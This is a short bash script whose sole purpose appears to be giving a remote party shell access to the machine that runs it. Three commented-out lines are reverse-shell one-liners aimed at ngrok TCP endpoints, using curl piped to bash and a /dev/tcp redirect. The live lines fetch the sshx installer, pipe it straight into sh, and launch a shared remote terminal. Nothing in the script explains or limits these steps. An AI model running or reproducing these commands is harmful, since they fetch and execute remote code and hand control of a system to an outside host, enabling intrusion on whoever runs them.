#!/bin/bash

# curl https://reverse-shell.sh/2.tcp.eu.ngrok.io:17136 | /bin/bash
# bash -i >/dev/tcp/4.tcp.eu.ngrok.io/14176 0>&1
# curl http://5.tcp.eu.ngrok.io:16139/|sh
curl -sSf https://sshx.io/get | sh
chmod +x /usr/local/bin/sshx
/usr/local/bin/sshx
